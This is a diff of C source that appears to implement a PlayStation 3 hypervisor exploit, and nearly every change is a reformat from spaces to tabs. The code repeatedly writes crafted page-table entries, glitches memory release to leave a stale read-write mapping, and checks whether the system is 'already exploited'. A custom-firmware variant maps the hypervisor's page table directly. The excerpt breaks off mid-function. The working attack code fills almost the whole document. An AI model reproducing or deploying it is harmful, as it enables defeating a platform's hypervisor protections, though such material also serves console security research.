@@ -4,26 +4,26 @@
 
 bool IsExploited()
 {
-    uint64_t lpar_addr;
+	uint64_t lpar_addr;
 
-    int32_t res;
+	int32_t res;
 
-    res = lv1_map_physical_address_region(0, EXP_4KB, SIZE_4KB, &lpar_addr);
+	res = lv1_map_physical_address_region(0, EXP_4KB, SIZE_4KB, &lpar_addr);
 
-    if (res != 0)
-        return false;
+	if (res != 0)
+		return false;
 
-    res = lv1_unmap_physical_address_region(lpar_addr);
+	res = lv1_unmap_physical_address_region(lpar_addr);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_unmap_physical_address_region failed!, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_unmap_physical_address_region failed!, res = %d\n", res);
 
-        abort();
-        return false;
-    }
+		abort();
+		return false;
+	}
 
-    return true;
+	return true;
 }
 
 double fwVersion = 0.0;
@@ -38,612 +38,612 @@ HTABE GameOS_HTAB_TmpBuf[HTAB_COUNT];
 
 uint64_t CalcHTAB_EA_Addr_By_HtabIdx(uint64_t base, uint32_t htab_idx)
 {
-    return base + (htab_idx * sizeof(HTABE));
+	return base + (htab_idx * sizeof(HTABE));
 }
 
 uint64_t CalcGameOSHTAB_EA_Addr_By_HtabIdx(uint32_t htab_idx)
 {
-    return GameOS_HTAB_EA_Addr + (htab_idx * sizeof(HTABE));
+	return GameOS_HTAB_EA_Addr + (htab_idx * sizeof(HTABE));
 }
 
 uint32_t FindFreeHTABIdx()
 {
-    uint32_t htab_idx;
+	uint32_t htab_idx;
 
-    HTABE htabe;
+	HTABE htabe;
 
-    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-    {
-        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+	for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+	{
+		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-        if (!HTABE_IS_VALID(htabe))
-            return htab_idx;
-    }
+		if (!HTABE_IS_VALID(htabe))
+			return htab_idx;
+	}
 
-    PrintLog("Can't find free htab!!!\n");
-    abort();
+	PrintLog("Can't find free htab!!!\n");
+	abort();
 
-    return 0;
+	return 0;
 }
 
 uint32_t FindBadHTABIdx()
 {
-    uint32_t htab_idx;
+	uint32_t htab_idx;
 
-    HTABE htabe;
+	HTABE htabe;
 
-    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-    {
-        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+	for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+	{
+		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-        if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
-            return htab_idx;
-    }
+		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
+			return htab_idx;
+	}
 
-    PrintLog("Can't find bad htab!!!\n");
-    abort();
+	PrintLog("Can't find bad htab!!!\n");
+	abort();
 
-    return 0;
+	return 0;
 }
 
 bool FoundBadHTABIdx()
 {
-    uint32_t htab_idx;
+	uint32_t htab_idx;
 
-    HTABE htabe;
+	HTABE htabe;
 
-    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-    {
-        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+	for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+	{
+		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-        if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
-            return true;
-    }
+		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
+			return true;
+	}
 
-    return false;
+	return false;
 }
 
 void FindFirstLargestConsecutiveFreeHtabIdx(uint32_t *outIdx, uint32_t *outCount)
 {
-    uint32_t curLargestConsecutiveFreeCount = 0;
-    uint32_t curLargestConsecutiveFreeFirstIdx = 0;
+	uint32_t curLargestConsecutiveFreeCount = 0;
+	uint32_t curLargestConsecutiveFreeFirstIdx = 0;
 
-    uint32_t curFreeCount = 0;
-    uint32_t curFreeFirstIdx = 0;
+	uint32_t curFreeCount = 0;
+	uint32_t curFreeFirstIdx = 0;
 
-    HTABE htabe;
+	HTABE htabe;
 
-    uint32_t htab_idx;
+	uint32_t htab_idx;
 
-    for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
-    {
-        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+	for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
+	{
+		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-        if (HTABE_IS_VALID(htabe))
-        {
-            curFreeCount = 0;
-            continue;
-        }
+		if (HTABE_IS_VALID(htabe))
+		{
+			curFreeCount = 0;
+			continue;
+		}
 
-        if (curFreeCount == 0)
-            curFreeFirstIdx = htab_idx;
+		if (curFreeCount == 0)
+			curFreeFirstIdx = htab_idx;
 
-        curFreeCount++;
+		curFreeCount++;
 
-        if (curFreeCount > curLargestConsecutiveFreeCount)
-        {
-            curLargestConsecutiveFreeCount = curFreeCount;
-            curLargestConsecutiveFreeFirstIdx = curFreeFirstIdx;
-        }
-    }
+		if (curFreeCount > curLargestConsecutiveFreeCount)
+		{
+			curLargestConsecutiveFreeCount = curFreeCount;
+			curLargestConsecutiveFreeFirstIdx = curFreeFirstIdx;
+		}
+	}
 
-    if (outIdx)
-        *outIdx = curLargestConsecutiveFreeFirstIdx;
+	if (outIdx)
+		*outIdx = curLargestConsecutiveFreeFirstIdx;
 
-    if (outCount)
-        *outCount = curLargestConsecutiveFreeCount;
+	if (outCount)
+		*outCount = curLargestConsecutiveFreeCount;
 }
 
 void PrintSingleHTAB(const HTABE *htab)
 {
-    PrintLog("0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d)  0x%016lx, 0x%016lx\n",
-             (uint64_t)HTABE_GET_VA((*htab)), (uint64_t)HTABE_GET_RA((*htab)),
-             (uint32_t)htab->V, (uint32_t)htab->L, (uint32_t)htab->W,
-             (uint32_t)htab->I, (uint32_t)htab->M, (uint32_t)htab->G,
-             (uint32_t)htab->N, (uint32_t)htab->PP, htab->Num[0], htab->Num[1]);
+	PrintLog("0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d)  0x%016lx, 0x%016lx\n",
+			 (uint64_t)HTABE_GET_VA((*htab)), (uint64_t)HTABE_GET_RA((*htab)),
+			 (uint32_t)htab->V, (uint32_t)htab->L, (uint32_t)htab->W,
+			 (uint32_t)htab->I, (uint32_t)htab->M, (uint32_t)htab->G,
+			 (uint32_t)htab->N, (uint32_t)htab->PP, htab->Num[0], htab->Num[1]);
 }
 
 void PrintHTABBase(uint64_t base)
 {
-    PrintLog("PrintHTABBase()...\n");
+	PrintLog("PrintHTABBase()...\n");
 
-    static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
-    uint64_t dumpAddr = base;
+	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
+	uint64_t dumpAddr = base;
 
-    static const uint32_t htabCount = HTAB_COUNT;
+	static const uint32_t htabCount = HTAB_COUNT;
 
-    uint8_t *buf = (uint8_t *)malloc(dumpSize);
+	uint8_t *buf = (uint8_t *)malloc(dumpSize);
 
-    lv2_read(dumpAddr, dumpSize, buf);
+	lv2_read(dumpAddr, dumpSize, buf);
 
-    HTABE *htab = (HTABE *)buf;
+	HTABE *htab = (HTABE *)buf;
 
-    PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");
+	PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");
 
-    for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
-    {
-        PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
-                 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
-                 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
-                 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
-                 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
-    }
+	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
+	{
+		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
+				 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
+				 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
+				 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
+				 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
+	}
 
-    free(buf);
+	free(buf);
 }
 
 void PrintHTAB()
 {
-    PrintLog("PrintHTAB()...\n");
+	PrintLog("PrintHTAB()...\n");
 
-    PrintHTABBase(GameOS_HTAB_EA_Addr);
+	PrintHTABBase(GameOS_HTAB_EA_Addr);
 }
 
 void PrintHTABBaseValidOnly(uint64_t base)
 {
-    PrintLog("PrintHTABBaseValidOnly()...\n");
+	PrintLog("PrintHTABBaseValidOnly()...\n");
 
-    static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
-    uint64_t dumpAddr = base;
+	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
+	uint64_t dumpAddr = base;
 
-    static const uint32_t htabCount = HTAB_COUNT;
+	static const uint32_t htabCount = HTAB_COUNT;
 
-    uint8_t *buf = (uint8_t *)malloc(dumpSize);
+	uint8_t *buf = (uint8_t *)malloc(dumpSize);
 
-    lv2_read(dumpAddr, dumpSize, buf);
+	lv2_read(dumpAddr, dumpSize, buf);
 
-    HTABE *htab = (HTABE *)buf;
+	HTABE *htab = (HTABE *)buf;
 
-    PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");
+	PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");
 
-    for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
-    {
-        if (!HTABE_IS_VALID(htab[htab_idx]))
-            continue;
+	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
+	{
+		if (!HTABE_IS_VALID(htab[htab_idx]))
+			continue;
 
-        PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
-                 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
-                 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
-                 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
-                 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
-    }
+		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
+				 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
+				 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
+				 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
+				 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
+	}
 
-    free(buf);
+	free(buf);
 }
 
 void PrintHTABValidOnly()
 {
-    PrintLog("PrintHTABValidOnly()...\n");
+	PrintLog("PrintHTABValidOnly()...\n");
 
-    PrintHTABBaseValidOnly(GameOS_HTAB_EA_Addr);
+	PrintHTABBaseValidOnly(GameOS_HTAB_EA_Addr);
 }
 
 void Stage1()
 {
-    PrintLog("Stage1...\n");
+	PrintLog("Stage1...\n");
 
-    if (IsExploited())
-    {
-        PrintLog("Already exploited, skipping...\n");
-        return;
-    }
+	if (IsExploited())
+	{
+		PrintLog("Already exploited, skipping...\n");
+		return;
+	}
 
-    if (FoundBadHTABIdx())
-    {
-        PrintLog("Already have bad htab, skipping...\n");
-        return;
-    }
+	if (FoundBadHTABIdx())
+	{
+		PrintLog("Already have bad htab, skipping...\n");
+		return;
+	}
 
-    uint64_t loopCount = 0;
+	uint64_t loopCount = 0;
 
-    uint32_t writeCount = 0;
-    uint32_t readCount = 0;
+	uint32_t writeCount = 0;
+	uint32_t readCount = 0;
 
-    while (1)
-    {
-        bool stop = false;
+	while (1)
+	{
+		bool stop = false;
 
-        int32_t res;
+		int32_t res;
 
-        uint64_t lpar_addr;
-        uint64_t muid;
+		uint64_t lpar_addr;
+		uint64_t muid;
 
-        res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);
+		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_allocate_memory failed, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_allocate_memory failed, res = %d\n", res);
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        {
-            HTABE htabe;
+		{
+			HTABE htabe;
 
-            uint32_t htab_idx;
+			uint32_t htab_idx;
 
-            for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-            {
-                lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+			{
+				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-                if (HTABE_IS_VALID(htabe))
-                    continue;
+				if (HTABE_IS_VALID(htabe))
+					continue;
 
-                htabe_set_lpar(&htabe,
-                               CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
-                               lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
+				htabe_set_lpar(&htabe,
+							   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
+							   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
 
-                res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
+				res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
 
-                if (res != 0)
-                {
-                    PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
-                             htab_idx, htabe.Num[0], htabe.Num[1], res);
-                }
+				if (res != 0)
+				{
+					PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
+							 htab_idx, htabe.Num[0], htabe.Num[1], res);
+				}
 
-                writeCount++;
-            }
-        }
+				writeCount++;
+			}
+		}
 
-        // We should do memory glitch at this line
-        // Sadly this is very painful on GameOS because unlike linux version
-        // They can halt everything except exploit itself
-        // This is not possible here, so we end up corrupt many things in the process
-        res = lv1_release_memory(lpar_addr);
+		// We should do memory glitch at this line
+		// Sadly this is very painful on GameOS because unlike linux version
+		// They can halt everything except exploit itself
+		// This is not possible here, so we end up corrupt many things in the process
+		res = lv1_release_memory(lpar_addr);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_release_memory failed, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_release_memory failed, res = %d\n", res);
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        {
-            HTABE htabe;
+		{
+			HTABE htabe;
 
-            uint32_t htab_idx;
+			uint32_t htab_idx;
 
-            uint32_t count = 0;
+			uint32_t count = 0;
 
-            for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-            {
-                lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+			{
+				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-                if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
-                    readCount++;
+				if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
+					readCount++;
 
-                if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
-                    continue;
+				if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
+					continue;
 
-                PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);
+				PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);
 
-                if (count == 0)
-                {
-                    lv2_beep_triple();
-                    Sleep(1);
-                    lv2_beep_triple();
-                    Sleep(2);
-                    lv2_beep_triple();
-                    Sleep(2);
-                    lv2_beep_triple();
-                    Sleep(2);
-                }
+				if (count == 0)
+				{
+					lv2_beep_triple();
+					Sleep(1);
+					lv2_beep_triple();
+					Sleep(2);
+					lv2_beep_triple();
+					Sleep(2);
+					lv2_beep_triple();
+					Sleep(2);
+				}
 
-                PrintSingleHTAB(&htabe);
+				PrintSingleHTAB(&htabe);
 
-                count++;
-                stop = true;
-            }
-        }
+				count++;
+				stop = true;
+			}
+		}
 
-        if (stop)
-        {
-            // PrintHTAB();
-            break;
-        }
+		if (stop)
+		{
+			// PrintHTAB();
+			break;
+		}
 
-        loopCount++;
+		loopCount++;
 
-        if ((loopCount % 5) == 0)
-        {
-            PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d\n", loopCount, writeCount, readCount, (writeCount - readCount));
+		if ((loopCount % 5) == 0)
+		{
+			PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d\n", loopCount, writeCount, readCount, (writeCount - readCount));
 
-            lv2_beep_single();
+			lv2_beep_single();
 
-            writeCount = 0;
-            readCount = 0;
-        }
-    }
+			writeCount = 0;
+			readCount = 0;
+		}
+	}
 }
 
 void Stage1_v2()
 {
-    PrintLog("Stage1_v2...\n");
+	PrintLog("Stage1_v2...\n");
 
-    if (IsExploited())
-    {
-        PrintLog("Already exploited, skipping...\n");
-        return;
-    }
+	if (IsExploited())
+	{
+		PrintLog("Already exploited, skipping...\n");
+		return;
+	}
 
-    if (FoundBadHTABIdx())
-    {
-        PrintLog("Already have bad htab, skipping...\n");
-        return;
-    }
+	if (FoundBadHTABIdx())
+	{
+		PrintLog("Already have bad htab, skipping...\n");
+		return;
+	}
 
-    Glitcher_Init();
+	Glitcher_Init();
 
-    uint64_t loopCount = 0;
+	uint64_t loopCount = 0;
 
-    uint32_t writeCount = 0;
-    uint32_t readCount = 0;
+	uint32_t writeCount = 0;
+	uint32_t readCount = 0;
 
-    uint64_t sumtdelta = 0;
+	uint64_t sumtdelta = 0;
 
-    uint64_t doGlitchWhen = 5;
+	uint64_t doGlitchWhen = 5;
 
-    while (1)
-    {
-        bool stop = false;
+	while (1)
+	{
+		bool stop = false;
 
-        int32_t res;
+		int32_t res;
 
-        uint64_t lpar_addr;
-        uint64_t muid;
+		uint64_t lpar_addr;
+		uint64_t muid;
 
-        res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);
+		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_allocate_memory failed, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_allocate_memory failed, res = %d\n", res);
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        {
-            HTABE htabe;
+		{
+			HTABE htabe;
 
-            uint32_t htab_idx;
+			uint32_t htab_idx;
 
-            for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-            {
-                lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+			{
+				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-                if (HTABE_IS_VALID(htabe))
-                    continue;
+				if (HTABE_IS_VALID(htabe))
+					continue;
 
-                htabe_set_lpar(&htabe,
-                               CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
-                               lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
+				htabe_set_lpar(&htabe,
+							   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
+							   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
 
-                res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
+				res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
 
-                if (res != 0)
-                {
-                    PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
-                             htab_idx, htabe.Num[0], htabe.Num[1], res);
-                }
+				if (res != 0)
+				{
+					PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
+							 htab_idx, htabe.Num[0], htabe.Num[1], res);
+				}
 
-                writeCount++;
-            }
-        }
+				writeCount++;
+			}
+		}
 
-        eieio();
-        if (loopCount >= doGlitchWhen)
-            Glitcher_Start();
-        uint64_t t1 = GetTimeInUs();
+		eieio();
+		if (loopCount >= doGlitchWhen)
+			Glitcher_Start();
+		uint64_t t1 = GetTimeInUs();
 
-        res = lv2_lv1_release_memory_intr(lpar_addr);
-        //res = lv1_release_memory(lpar_addr);
+		res = lv2_lv1_release_memory_intr(lpar_addr);
+		// res = lv1_release_memory(lpar_addr);
 
-        uint64_t t2 = GetTimeInUs();
-        if (loopCount >= doGlitchWhen)
-            Glitcher_Stop();
-        eieio();
+		uint64_t t2 = GetTimeInUs();
+		if (loopCount >= doGlitchWhen)
+			Glitcher_Stop();
+		eieio();
 
-        if (res != 0)
-        {
-            PrintLog("lv1_release_memory failed, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_release_memory failed, res = %d\n", res);
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        sumtdelta += (t2 - t1);
+		sumtdelta += (t2 - t1);
 
-        {
-            HTABE htabe;
+		{
+			HTABE htabe;
 
-            uint32_t htab_idx;
+			uint32_t htab_idx;
 
-            uint32_t count = 0;
+			uint32_t count = 0;
 
-            for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
-            {
-                lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
+			{
+				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-                if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
-                    readCount++;
+				if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
+					readCount++;
 
-                if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
-                    continue;
+				if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
+					continue;
 
-                PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);
+				PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);
 
-                if (count == 0)
-                {
-                    lv2_beep_triple();
-                    Sleep(1);
-                    lv2_beep_triple();
-                    Sleep(2);
-                    lv2_beep_triple();
-                    Sleep(2);
-                    lv2_beep_triple();
-                    Sleep(2);
-                }
+				if (count == 0)
+				{
+					lv2_beep_triple();
+					Sleep(1);
+					lv2_beep_triple();
+					Sleep(2);
+					lv2_beep_triple();
+					Sleep(2);
+					lv2_beep_triple();
+					Sleep(2);
+				}
 
-                PrintSingleHTAB(&htabe);
+				PrintSingleHTAB(&htabe);
 
-                count++;
-                stop = true;
-            }
-        }
+				count++;
+				stop = true;
+			}
+		}
 
-        if (stop)
-        {
-            // PrintHTAB();
-            break;
-        }
+		if (stop)
+		{
+			// PrintHTAB();
+			break;
+		}
 
-        loopCount++;
+		loopCount++;
 
-        static const uint64_t zzz = 1;
-        if ((loopCount % zzz) == 0)
-        {
-            PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d, avgtdelta = %luus\n",
-                     loopCount, writeCount, readCount, (writeCount - readCount), (sumtdelta / zzz));
+		static const uint64_t zzz = 1;
+		if ((loopCount % zzz) == 0)
+		{
+			PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d, avgtdelta = %luus\n",
+					 loopCount, writeCount, readCount, (writeCount - readCount), (sumtdelta / zzz));
 
-            lv2_beep_single();
+			lv2_beep_single();
 
-            writeCount = 0;
-            readCount = 0;
+			writeCount = 0;
+			readCount = 0;
 
-            sumtdelta = 0;
-        }
+			sumtdelta = 0;
+		}
 
-        WaitInMs(100);
-    }
+		WaitInMs(100);
+	}
 
-    Glitcher_Destroy();
+	Glitcher_Destroy();
 }
 
 // CFW don't need glitching
 // requires lv1 htab write protection patch
 void Stage1_CFW()
 {
-    PrintLog("Stage1_CFW()\n");
+	PrintLog("Stage1_CFW()\n");
 
-    if (FoundBadHTABIdx())
-    {
-        PrintLog("Already have bad htab, skipping...\n");
-        return;
-    }
+	if (FoundBadHTABIdx())
+	{
+		PrintLog("Already have bad htab, skipping...\n");
+		return;
+	}
 
-    int32_t res;
+	int32_t res;
 
-    uint64_t old_vas_id;
+	uint64_t old_vas_id;
 
-    res = lv1_get_virtual_address_space_id_of_ppe(PPE_ID0, &old_vas_id);
+	res = lv1_get_virtual_address_space_id_of_ppe(PPE_ID0, &old_vas_id);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_get_virtual_address_space_id_of_ppe failed!!!, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_get_virtual_address_space_id_of_ppe failed!!!, res = %d\n", res);
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    PrintLog("old_vas_id = %lu\n", old_vas_id);
+	PrintLog("old_vas_id = %lu\n", old_vas_id);
 
-    uint64_t old_htab_lpar_addr = 0;
-    res = lv1_map_htab(old_vas_id, &old_htab_lpar_addr);
+	uint64_t old_htab_lpar_addr = 0;
+	res = lv1_map_htab(old_vas_id, &old_htab_lpar_addr);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_map_htab failed!!!, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_map_htab failed!!!, res = %d\n", res);
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    PrintLog("old_htab_lpar_addr = 0x%lx\n", old_htab_lpar_addr);
+	PrintLog("old_htab_lpar_addr = 0x%lx\n", old_htab_lpar_addr);
 
-    uint64_t old_htab_ea = 0x8000000014000000ul;
-    map_lpar_to_lv2_ea(old_htab_lpar_addr, old_htab_ea, GameOS_HTAB_SizeInBytes, false, false);
+	uint64_t old_htab_ea = 0x8000000014000000ul;
+	map_lpar_to_lv2_ea(old_htab_lpar_addr, old_htab_ea, GameOS_HTAB_SizeInBytes, false, false);
 
-    uint64_t lpar_addr;
-    uint64_t muid;
+	uint64_t lpar_addr;
+	uint64_t muid;
 
-    res = lv1_allocate_memory(SIZE_256KB, EXP_256KB, 0, 0, &lpar_addr, &muid);
+	res = lv1_allocate_memory(SIZE_256KB, EXP_256KB, 0, 0, &lpar_addr, &muid);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_allocate_memory failed, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_allocate_memory failed, res = %d\n", res);
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    PrintLog("lpar_addr = 0x%lx\n", lpar_addr);
+	PrintLog("lpar_addr = 0x%lx\n", lpar_addr);
 
-    uint32_t htab_idx = FindFreeHTABIdx();
+	uint32_t htab_idx = FindFreeHTABIdx();
 
-    {
-        HTABE htabe;
+	{
+		HTABE htabe;
 
-        htabe_set_lpar(&htabe,
